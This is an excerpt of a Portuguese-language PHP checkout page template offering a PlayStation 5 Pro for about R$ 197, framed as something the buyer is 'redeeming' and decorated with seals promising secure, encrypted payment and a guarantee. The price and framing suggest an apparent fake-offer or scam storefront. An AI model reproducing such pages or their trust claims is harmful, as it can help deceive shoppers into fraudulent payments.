...
$OFFER_HASH        = 'ZoAmVaXg';
$PRODUCT_HASH      = 'h1kwdbi5nw';
$BASE_AMOUNT       = 19713;
$PRODUCT_TITLE     = 'Playstation 5 Pro Ssd Com 2tb 8k Wifi 7 Vvr Upscaling Edição Digital Branco Controle Dualsense';
...
$SECURITY_SEAL_SETTINGS = json_decode('{"enabled":true,"backgroundColor":"#ffffff","items":[{"id":"seal-1","icon":"eye-slash","title":"Dados protegidos","text":"Os seus dados são confidenciais e seguros."},{"id":"seal-2","icon":"lock","title":"Pagamento 100% Seguro","text":"As informações desta compra são criptografadas."},{"id":"seal-4","icon":"shield","title":"Garantia de 7 dias","text":"Você esta protegido por uma garantia de satisfação"}]}', true);
...
function render_checkout_component($component_id, $all_components_map) {
    ...
    $checkout_settings = [
        ...
        'summaryText' => 'Você está resgatando:',
        'productLogoURL' => 'https://i.postimg.cc/cLsBY6RR/s1.jpg',
        'title' => 'Playstation 5 Pro Ssd Com 2tb 8k Wifi 7 Vvr Upscaling Edição Digital Branco Controle Dualsense',
        'amountFormatted' => 'R$ ' . number_format(19713 / 100, 2, ',', '.'),
...
<head>
    ...
    <title><?php echo htmlspecialchars('Playstation 5 Pro Ssd Com 2tb 8k Wifi 7 Vvr Upscaling Edição Digital Branco Controle Dualsense'); ?></title>
...
document.addEventListener('DOMContentLoaded', () => {
    ...
    let totalAmount = 19713;
    let baseAmount = 19713;
